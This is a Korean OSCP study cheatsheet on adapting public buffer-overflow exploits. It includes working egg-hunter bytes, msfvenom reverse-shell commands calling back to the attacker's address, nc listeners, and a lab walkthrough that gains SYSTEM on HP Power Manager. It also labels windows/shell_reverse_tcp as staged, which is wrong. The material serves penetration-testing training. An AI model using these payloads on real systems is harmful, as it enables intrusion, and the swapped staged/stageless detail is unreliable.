---
title: "버퍼 오버플로 & 익스플로잇 수정 (Buffer Overflows & Exploit Fixing)"
date: 2026-06-20
weight: 140
draft: false
tags: ["oscp", "cheatsheet"]
summary: "공개 BOF 익스플로잇을 대상 환경에 맞게 수정하는 절차 모음."
---

공개 BOF 익스플로잇을 대상에 맞게 수정하는 절차 모음.

- 출처: https://heretek.dev/oscp-cheatsheet/buffer-overflows/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

## 시험 노트

- 2024년 11월부로 BOF 머신이 시험에 나온다는 보장은 없어졌다.
- 그래도 버퍼 오버플로를 쓰는 공개 익스플로잇을 수정하는 능력은 여전히 필수다. 이 문서는 정확히 그 방법을 다룬다.

## 개요 (The Big Picture)

버퍼 오버플로 익스플로잇은 프로그램 메모리를 덮어써 실행 흐름을 가로챈다. 모든 BOF 익스플로잇은 같은 구조를 갖는다.

```text
[PADDING] + [RETURN ADDRESS] + [NOP SLED] + [SHELLCODE]
```

공개 익스플로잇을 수정할 때 우리 일은 대부분 쉘코드만 자기 것으로 교체하는 것이다. 가끔은 다른 OS 버전용으로 RETURN ADDRESS만 갱신하면 된다.

## BOF 익스플로잇의 5가지 구성 요소

### 1. PADDING (버퍼를 채운다)

```python
"\x41"*256
```

- `\x41` = 문자 "A"
- saved return address에 도달할 때까지 버퍼를 채운다
- 숫자(256)는 취약 앱마다 다르다 — 익스플로잇 작성자가 찾아둔 값
- 수정 불필요

### 2. RETURN ADDRESS (실행 흐름을 탈취한다)

```python
RET = "\xCF\xBC\x08\x76"  # JMP ESP in MSVCP60.dll
```

- 스택의 saved return address를 덮어쓴다
- 앱이 로드한 DLL 안의 `JMP ESP` 명령을 가리킨다
- ESP는 스택에서 RET 다음에 오는 것, 즉 쉘코드를 가리킨다
- OS 버전 의존적 (중요) — Windows 버전마다 DLL 주소가 다르다
- 보통은 수정 불필요 — 익스플로잇이 테스트된 OS와 다른 대상을 공격할 때만 변경

### 3. NOP SLED (착륙 활주로)

```python
"\x90"*32
```

- `\x90` = NOP 명령 ("아무 것도 하지 않고 다음 명령으로 진행")
- 활주로 역할 — 점프가 쉘코드 위에 정확히 떨어지지 않아도 NOP을 미끄러져 내려가 내 코드에 도달한다
- 수정 불필요

### 4. EGG HUNTER (선택적 — 쉘코드가 너무 클 때 사용)

```python
EH = '\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH += '\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH += '\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH += '\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
```

- 메모리 전체를 훑어 태그(`n00bn00b`, `w00tw00t` 같은)를 찾는 작은 코드
- RET 뒤 버퍼 공간이 전체 쉘코드를 담기에 너무 작을 때 사용
- 실제 쉘코드는 요청의 다른 위치(예: User-Agent 헤더)에 둔다
- egg hunter가 태그를 찾아 그 뒤의 쉘코드로 점프한다
- egg hunter 코드 자체는 수정 불필요
- 태그 유지 필수 (중요) — `"n00bn00b"` 같은 태그를 SHELL 변수 맨 앞에 남긴다

### 5. SHELLCODE (페이로드 — 교체하는 대상)

```python
SHELL = "n00bn00b"           # <-- egg hunter tag (keep if egg hunter exists)
SHELL += "\x33\xc9\x83..."   # <-- machine code that runs after exploit succeeds
```

- 실제로 실행되는 코드: reverse shell, bind shell, 명령 실행 등
- msfvenom으로 생성해서 교체하는 부분 (교체 대상)

## msfvenom으로 쉘코드 생성

### 기본 명령

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f py -b '<BAD_CHARS>' -v SHELL
```

### 플래그 설명

- `-p windows/shell_reverse_tcp` — 페이로드: TCP 역방향 Windows 쉘
- `LHOST=tun0` — 내 IP(공격자) — 쉘이 돌아올 주소
- `LPORT=4444` — 내 리스닝 포트
- `-f py` — 출력 형식: Python 변수 (파이썬 익스플로잇에 붙여넣는다)
- `-b '\x00\x3a...'` — 배제할 bad characters (아래 참조)
- `-v SHELL` — 출력 변수 이름을 SHELL로 (익스플로잇의 변수 이름과 일치)

### Bad Character 찾기

작성자가 주석에 항상 적어둔다. 찾았으면 그 값을 그대로 `-b` 플래그에 복사한다.

```python
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f..."
```

흔한 bad character와 이유:

- `\x00` — null byte, C 문자열을 끊는다
- `\x0a` — newline (`\n`), HTTP 헤더를 깬다
- `\x0d` — carriage return (`\r`), HTTP 헤더를 깬다
- `\x20` — space, URL/HTTP 파싱을 깬다
- `\x2f` — forward slash (`/`), URL을 깬다
- `\x3f` — question mark (`?`), URL을 깬다
- `\x25` — percent sign (`%`), URL 인코딩을 깬다
- bad character 목록이 없을 때의 최소 안전 세트: `-b '\x00'`

### 대상별 페이로드 옵션

```bash
# Windows 32-bit reverse shell (most common for OSCP BOF)
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHARS>' -v SHELL

# Windows 64-bit reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHARS>' -v SHELL

# Linux 32-bit reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHARS>' -v SHELL

# Linux 64-bit reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHARS>' -v SHELL

# Windows bind shell (target opens port, you connect to it — rare)
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f py -b '<BADCHARS>' -v SHELL
```

### 출력 형식 (익스플로잇 언어에 맞춘다)

```bash
-f py       # Python: SHELL = "\xeb\x03..."    (for Python exploits)
-f c        # C:      unsigned char SHELL[] =   (for C exploits)
-f raw      # Raw bytes                         (pipe to file)
-f exe      # Standalone .exe                   (for file upload/transfer)
-f elf      # Standalone Linux binary           (for file upload/transfer)
```

## 공개 BOF 익스플로잇 수정 전체 과정

### Step 1 — 익스플로잇을 읽고 핵심 요소를 파악

- 어떤 PORT를 대상으로 하는가?
- BAD CHARACTERS는 무엇인가? ("badchar" 주석 확인)
- 쉘코드가 BIND 쉘인가 REVERSE 쉘인가?
- 어떤 OS에서 TEST됐는가?
- EGG HUNTER가 있는가? (n00bn00b, w00tw00t 같은 태그 검색)
- 쉘코드를 담는 VARIABLE NAME은 무엇인가? (SHELL, shellcode, buf 등)
- PYTHON 2인가 PYTHON 3인가? (print 괄호 유무로 판별)

### Step 2 — 새 쉘코드를 생성

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f py -b '<BAD_CHARS>' -v <VARIABLE_NAME>
```

### Step 3 — 익스플로잇의 쉘코드를 교체

- 기존 SHELL/shellcode 변수 내용을 삭제한다
- msfvenom 출력을 붙여넣는다
- Python 2 익스플로잇이면 (print에 괄호 없음): 모든 줄에서 `b` 접두사를 제거한다

```python
# msfvenom gives you (Python 3 format):
SHELL =  b""
SHELL += b"\xeb\x03\x59..."

# Change to (Python 2 format):
SHELL =  ""
SHELL += "\xeb\x03\x59..."
```

- egg hunter가 있으면: 태그를 SHELL의 첫 줄에 유지한다

```python
SHELL = ""
SHELL += "n00bn00b"          # <-- KEEP THIS if egg hunter exists
SHELL += "\x33\xc9\x83..."   # <-- your new msfvenom shellcode
```

### Step 4 — 그 외 수정할 것을 확인

- 하드코딩된 IP? → 대상 IP로 변경
- 하드코딩된 포트? → 대상 서비스와 일치하는지 확인
- 하드코딩된 경로? → 대상 애플리케이션과 일치하는지 확인
- Content-Length 헤더? → 쉘코드 크기가 크게 바뀌었다면 갱신 필요

### Step 5 — 리스너를 띄우고 실행

```bash
# Terminal 1: start listener FIRST
nc -lvnp 4444
# or
rlwrap nc -lvnp 4444

# Terminal 2: run exploit
python2 exploit.py $ip        # Python 2 exploit
python3 exploit.py $ip        # Python 3 exploit
```

기억할 것:

- Bind shell (구식) → 내가 대상에 접속: `nc $ip 4444`
- Reverse shell (표준) → 대상이 나에게 접속: `nc -lvnp 4444` (리스너를 먼저)

## Bind Shell vs Reverse Shell — 언제 무엇을 쓰나

- Reverse shell — 대상이 나에게 역방향으로 연결 — 기본 선택 (95%는 이것)
- Bind shell — 대상이 포트를 열고 내가 접속 — reverse 실패 시에만 (방화벽이 아웃바운드를 차단)

항상 reverse shell을 먼저 시도한다. 안 되면 대상이 방화벽으로 아웃바운드를 막는 것일 수 있다 — bind shell로 전환한다.

## 문제 해결 — 익스플로잇이 동작하지 않을 때

쉘을 못 받았을 때:

1. Python 2인가 3인가? 익스플로잇의 print 문으로 판별
2. egg hunter 태그가 있었다면 남겼는가?
3. LHOST가 맞는가? (`ip a` → tun0 확인)
4. 익스플로잇을 보내기 전에 리스너가 실행 중이었는가?
5. Python 2 익스플로잇의 `b` 접두사를 제거했는가?

Connection refused / 포트가 열리지 않을 때:

1. 대상 서비스가 기대한 포트에서 실제로 실행 중인가?
2. 익스플로잇이 서비스를 크래시시켰는가? 일부 BOF 익스플로잇은 한 번만 동작한다 — 박스를 리셋

쉘코드 생성 실패 / 너무 클 때:

1. 다른 인코더 시도: msfvenom에 `-e x86/shikata_ga_nai` 추가
2. 더 작은 페이로드 사용: `windows/shell_reverse_tcp`(staged)가 `windows/shell/reverse_tcp`(stageless)보다 작다
3. 익스플로잇 주석에 크기 제약이 적혀 있는지 확인

OS 버전이 다를 때:

1. RETURN ADDRESS(RET)는 OS 전용이다
2. 대상 OS가 익스플로잇의 테스트 OS와 다르면 RET 주소가 틀릴 수 있다
3. searchsploit에서 내 OS를 대상으로 하는 다른 버전의 익스플로잇을 찾는다
4. OSCP에서는 대부분의 BOF 익스플로잇이 쉘코드 교체만으로 그대로 동작한다

## 실전 예시 — HP Power Manager (retired HTB box)

- 서비스 발견: HP Power Manager, 포트 80
- 익스플로잇 발견: `searchsploit hppower` → `windows/remote/10099.py`
- 읽고 파악한 것:
  - bad chars: `\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a`
  - 기존 쉘코드: 포트 4444 bind shell
  - egg hunter: 있음 (태그 = `n00bn00b`)
  - 변수 이름: `SHELL`
  - Python 버전: Python 2
- 새 쉘코드 생성:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' -v SHELL
```

- 쉘코드 교체:
  - 기존 SHELL 내용 삭제
  - 새 msfvenom 출력 붙여넣기
  - 모든 줄에서 `b` 접두사 제거 (Python 2)
  - SHELL 맨 앞의 `"n00bn00b"` 태그 유지
- 실행:

```bash
# Terminal 1:
nc -lvnp 4444

# Terminal 2:
python2 10099.py $ip
```

결과: SYSTEM 쉘 획득.

> 익스플로잇을 읽는다. 쉘코드를 찾는다. bad character를 찾는다. 새 쉘코드를 생성한다. 교체한다. 실행한다. 쉘.
